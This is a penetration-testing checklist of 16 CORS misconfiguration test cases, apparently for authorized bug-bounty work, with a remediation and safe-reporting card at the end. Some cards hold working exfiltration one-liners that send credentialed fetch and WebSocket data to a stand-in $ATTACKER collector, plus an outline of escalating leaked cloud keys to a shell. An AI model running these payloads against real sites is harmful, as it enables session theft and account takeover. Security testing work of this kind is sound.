# CORS — Checklist

Expert per-attack **test-case matrix** for CORS — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*16 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## CORS-001 — Find CORS endpoints that return secrets
**Test Category:** Recon · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** /api/me, /account, /api/keys, /oauth/token, /graphql, /api/csrf; api./app./dev./staging. subdomains

**Test Steps:** 1. Enumerate every endpoint returning Access-Control-Allow-* (proxy history + cors_scan.py).<br>2. Tag each: authenticated? returns a secret (token/API key/PII/CSRF token)? cookie-auth?<br>3. Grep JS for withCredentials / credentials:'include'; list per-subdomain policies.

**Expected Result:** A prioritised list of credentialed, secret-bearing CORS endpoints.

**Payload Example:**

```
/api/me (token) ; /api/keys ; /api/csrf ; withCredentials:true in bundle
```

**Impact:** A reflected header on a secret-less endpoint is worthless; target secret-bearing ones.

**Tools:** poc/cors_scan.py, Corsy

**References:** CWE-942; OWASP Testing Guide: Testing CORS (WSTG-CLNT-07)

---

## CORS-002 — Baseline — read ACAO/ACAC + confirm a secret
**Test Category:** Baseline · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each candidate endpoint

**Test Steps:** 1. Send Origin: https://evil.com; record Access-Control-Allow-Origin returned.<br>2. Record Access-Control-Allow-Credentials (true/absent).<br>3. Logged in as a test account, confirm the body actually contains a secret. Classify: reflect-any / null / allowlist / wildcard / static / no-ACAO.

**Expected Result:** The ACAO/ACAC behaviour is recorded and a real secret confirmed in the body.

**Payload Example:**

```
curl -H 'Origin: https://evil.com' $URL | grep -i access-control ; body has session token
```

**Impact:** ACAC:true + a real secret is the whole game; a reflected ACAO without either is Info.

**Tools:** curl, Burp

**References:** CWE-942; PortSwigger Web Security Academy: CORS

---

## CORS-003 — Map ACAO logic (origin battery)
**Test Category:** ACAO Logic · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** The Origin request header

**Test Steps:** 1. Fire the battery: evil.com, null, target.com.evil.com, eviltarget.com, sub.target.com, backtick/comma variants.<br>2. Infer the server rule: reflect / endsWith / startsWith / contains / regex / *.target.com.<br>3. Also test scheme/port/case/trailing-dot/userinfo normalization gaps.

**Expected Result:** The server's origin-validation rule is inferred from which origins are echoed.

**Payload Example:**

```
Origin battery: nottarget.com, target.com.evil.com, target.com%60.evil.com, null
```

**Impact:** Knowing the rule selects the one attacker origin that defeats it.

**Tools:** curl, Burp Intruder

**References:** CWE-942; HackTricks: CORS bypass

---

## CORS-004 — Reflect-any origin + credentials
**Test Category:** Bypass · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Endpoints that reflect any Origin with ACAC:true

**Test Steps:** 1. Confirm several random origins are echoed into ACAO with ACAC:true.<br>2. No bypass needed - your origin is already trusted.<br>3. Proceed to the credentialed-read PoC.

**Expected Result:** Arbitrary attacker origins are reflected into ACAO with ACAC:true.

**Payload Example:**

```
Origin: https://a1b2c3.example -> ACAO: https://a1b2c3.example + ACAC: true
```

**Impact:** Any site can read the victim's credentialed response - High/Critical.

**Tools:** curl, Burp

**References:** CWE-942; CWE-346; PortSwigger Web Security Academy: CORS

---

## CORS-005 — null-origin trust (sandboxed iframe)
**Test Category:** Bypass · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Endpoints allowing Origin: null with ACAC:true

**Test Steps:** 1. Confirm ACAO: null + ACAC: true.<br>2. A sandboxed iframe (no allow-same-origin) runs with origin null: &lt;iframe sandbox=allow-scripts srcdoc=...fetch(credentials:include)...&gt;.<br>3. postMessage the secret to the parent and exfil.

**Expected Result:** The null-origin sandboxed iframe reads the victim's credentialed response.

**Payload Example:**

```
Origin: null -> ACAO: null + ACAC: true ; sandboxed-iframe fetch credentials:include
```

**Impact:** Cross-origin credentialed read via null-origin trust - High.

**Tools:** poc/null.html

**References:** CWE-942; CWE-346; PortSwigger Web Security Academy: CORS

---

## CORS-006 — Allowlist weakness (endsWith/startsWith/contains/regex)
**Test Category:** Bypass · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Endpoints with a weak origin allowlist

**Test Steps:** 1. Match the flaw to the origin: endsWith -&gt; nottarget.com/eviltarget.com; startsWith -&gt; target.com.evil.com; contains -&gt; target.com.evil.com; unescaped-dot regex -&gt; targetXcom.<br>2. Register/host the satisfying attacker origin.<br>3. Confirm reflection + ACAC:true.

**Expected Result:** An attacker-registrable origin satisfies the weak allowlist.

**Payload Example:**

```
endsWith(target.com) -> register eviltarget.com ; regex target\.com -> targetXcom
```

**Impact:** Credentialed read via allowlist bypass - High.

**Tools:** curl, Burp

**References:** CWE-942; HackTricks: CORS bypass

---

## CORS-007 — *.target.com only -&gt; subdomain takeover / XSS
**Test Category:** Bypass · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Policies trusting only *.target.com

**Test Steps:** 1. You can't forge from evil.com - obtain a trusted origin via a subdomain takeover or XSS on a real subdomain.<br>2. Host the exfil there so its Origin is trusted.<br>3. Confirm the credentialed read from the sub.

**Expected Result:** A controlled real subdomain provides a trusted origin for the read.

**Payload Example:**

```
subdomain takeover of dev.target.com -> host exfil.html there (trusted origin)
```

**Impact:** Credentialed read via a controlled subdomain - High.

**Tools:** Subdomain-takeover/XSS kits

**References:** CWE-942; HackTricks: CORS bypass

---

## CORS-008 — Preflight — custom-header reads &amp; credentialed writes
**Test Category:** Preflight / Write · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** OPTIONS preflight (ACAM/ACAH/Expose-Headers)

**Test Steps:** 1. Preflight: does ACAM allow PUT/DELETE and ACAH allow authorization/x-api-key for your origin with ACAC:true?<br>2. Credentialed JSON/PUT WRITE + read result (e.g. change email -&gt; ATO).<br>3. Access-Control-Expose-Headers: can JS read a secret in a RESPONSE header?

**Expected Result:** The permissive preflight enables custom-header reads and credentialed writes.

**Payload Example:**

```
OPTIONS -> ACAM: PUT + ACAH: authorization + ACAC: true ; fetch PUT credentials:include
```

**Impact:** Cross-origin credentialed WRITE / header-secret read -&gt; ATO - High/Critical.

**Tools:** curl -X OPTIONS, Burp

**References:** CWE-942; PortSwigger Web Security Academy: CORS

---

## CORS-009 — Credentialed read -&gt; token/API-key -&gt; ATO
**Test Category:** Impact — ATO · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** A confirmed trusted-origin + secret-bearing endpoint

**Test Steps:** 1. Build exfil.html with YOUR origin; fetch(TARGET,{credentials:'include'}) while test account A is logged in.<br>2. Ship A's secret (session token / API key) to your collector.<br>3. Replay it -&gt; confirm account takeover.

**Expected Result:** The victim's session token / API key is read cross-origin and replays into their account.

**Payload Example:**

```
fetch('$URL',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('$ATTACKER/c',d))
```

**Impact:** Account takeover via cross-origin secret theft - Critical.

**Tools:** poc/exfil.html

**References:** CWE-942; PortSwigger Web Security Academy: CORS

---

## CORS-010 — CORS-readable CSRF token -&gt; state change -&gt; ATO
**Test Category:** Impact — ATO · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** A CORS-readable anti-CSRF token endpoint

**Test Steps:** 1. fetch('/api/csrf',{credentials:'include'}) cross-origin to steal the token.<br>2. Use it to perform a protected change (email/password) as the victim.<br>3. Confirm the ATO on your own account in the PoC.

**Expected Result:** A stolen anti-CSRF token completes a protected state change.

**Payload Example:**

```
read /api/csrf cross-origin -> POST /account/email with X-CSRF-Token -> reset -> ATO
```

**Impact:** CORS -&gt; CSRF-token theft -&gt; account takeover - Critical.

**Tools:** poc/exfil.html

**References:** CWE-942; CWE-352; PortSwigger Web Security Academy: CORS

---

## CORS-011 — CORS-leaked cloud/CI/admin secret -&gt; RCE / shell
**Test Category:** Impact — RCE Chain · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** A credentialed CORS read that returns a cloud key / CI token / admin API key

**Test Steps:** 1. When the cross-origin read yields not just a session but a CLOUD/admin/CI secret, chain it: cloud creds -&gt; cloud 'run-command' (SSM/Functions) -&gt; shell; CI token -&gt; pipeline job -&gt; RCE; admin key -&gt; an admin code-exec feature.<br>2. Validate the secret read-only (sts get-caller-identity), then STOP - own tenant only.<br>3. This is the top CORS ceiling the guide flags as Critical.

**Expected Result:** A CORS-read secret is proven to reach code execution (own tenant, benign).

**Payload Example:**

```
read /api/config cross-origin -> AWS key -> aws sts get-caller-identity (own tenant) -> run-command
```

**Impact:** CORS misconfig -&gt; cloud/CI/admin RCE - the maximum-impact CORS chain. Critical.

**Tools:** aws cli, CI tooling

**References:** CWE-942; CWE-522; PortSwigger Web Security Academy: CORS

---

## CORS-012 — CORS response cache poisoning (missing Vary: Origin)
**Test Category:** Impact — Cache · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Reflected ACAO on a cacheable response with no Vary: Origin

**Test Steps:** 1. Inject Origin: evil.com; confirm it's reflected AND cacheable AND no Vary: Origin.<br>2. A clean follow-up on the same URL serves the evil.com ACAO from cache (Age/X-Cache:hit).<br>3. Prove on a benign/unique key; describe shared impact.

**Expected Result:** The reflected attacker ACAO is served from a shared cache to other users.

**Payload Example:**

```
reflected ACAO evil.com + cacheable + no Vary: Origin -> poisoned for all
```

**Impact:** Mass cross-origin theft / DoS via poisoned CORS cache - High/Critical.

**Tools:** Burp Param Miner

**References:** CWE-942; CWE-524; PortSwigger Web Security Academy: CORS

---

## CORS-013 — Cross-Site WebSocket Hijacking (CSWSH)
**Test Category:** Impact — CSWSH · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Cookie-authenticated WS endpoint that ignores Origin

**Test Steps:** 1. Replay the WS handshake with a foreign Origin -&gt; does the authenticated upgrade still succeed (101)?<br>2. From an attacker page: new WebSocket('wss://target/chat') carries victim cookies with no CORS gate.<br>3. Read/act as the victim; exfil the stream.

**Expected Result:** A cross-origin page opens an authenticated WebSocket as the victim.

**Payload Example:**

```
new WebSocket('wss://target.com/chat'); ws.onmessage=e=>sendBeacon('$ATTACKER/x',e.data)
```

**Impact:** Cross-origin authenticated WebSocket read/act - High.

**Tools:** Burp WS, wscat

**References:** CWE-942; CWE-1385; CWE-346; PortSwigger Web Security Academy: CORS

---

## CORS-014 — Private Network Access (public page -&gt; intranet)
**Test Category:** Impact — PNA · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Internal/localhost service granting Access-Control-Allow-Private-Network

**Test Steps:** 1. Preflight with Access-Control-Request-Private-Network: true to a LAN/localhost device.<br>2. Exploitable if it returns Access-Control-Allow-Private-Network: true (+ permissive ACAO).<br>3. A public page then drives the router/IoT/localhost dev-admin; else pivot to DNS rebinding.

**Expected Result:** A public attacker page reaches the victim's internal/localhost service.

**Payload Example:**

```
OPTIONS http://192.168.1.1/ + Access-Control-Request-Private-Network: true -> allowed
```

**Impact:** Public-&gt;private intranet access (router/IoT/dev-admin) - High.

**Tools:** curl -X OPTIONS

**References:** CWE-942; CWE-918; HackTricks: CORS bypass

---

## CORS-015 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: ACAO:* on public/non-sensitive data with no creds (Info); reflected origin WITHOUT ACAC:true and no sensitive/auth-less body; ACAO:* AND ACAC:true together (browser ignores for creds - not exploitable); static correct ACAO you don't control; 'vulnerable' proven only by curl with no browser read.<br>2. REQUIRE: an attacker-controlled origin (or null) trusted WITH credentials AND a real secret read in a browser.

**Expected Result:** Only attacker-origin + ACAC:true + real-secret-read candidates survive.

**Payload Example:**

```
ACAO:* + ACAC:true = not exploitable ; curl-only = not proven ; no ACAC + no secret = Info
```

**Impact:** Protects credibility; CORS is dense with reflected-header-without-impact false positives.

**Tools:** real browser

**References:** CWE-942; PortSwigger Web Security Academy: CORS

---

## CORS-016 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Name the secret + its impact (ATO / data breach / CSRF chain / RCE chain if a cloud/admin key).<br>2. Provide the fetch() PoC, proof of the cross-origin read in a REAL browser with your own accounts, and the ACAO/ACAC headers.<br>3. Set CVSS 3.1 + CWE-942/346 (+1385 for CSWSH). Remediation: strict origin allowlist (no reflection), never reflect null, never pair credentials with a dynamic/wildcard origin, add Vary: Origin, validate WS handshake Origin.<br>4. Own 2 accounts, benign collector, redact the secret, take the exfil page down; de-dupe.

**Expected Result:** A reproducible, browser-confirmed, correctly-rated PoC with clear remediation.

**Payload Example:**

```
PoC: fetch() read in a real browser + ACAO/ACAC headers + named secret + CVSS + CWE-942 + remediation.
```

**Impact:** Converts the credentialed read into a defensible High/Critical report.

**Tools:** CVSS calculator, CORS_REPORT_TEMPLATE.md

**References:** CWE-942; CWE-346; FIRST CVSS v3.1; OWASP Testing Guide: Testing CORS (WSTG-CLNT-07)  |  TOP REFERENCES: PortSwigger Academy CORS; Christian Schneider CSWSH; James Kettle cache research; W3C Private Network Access; s0md3v/Corsy

---
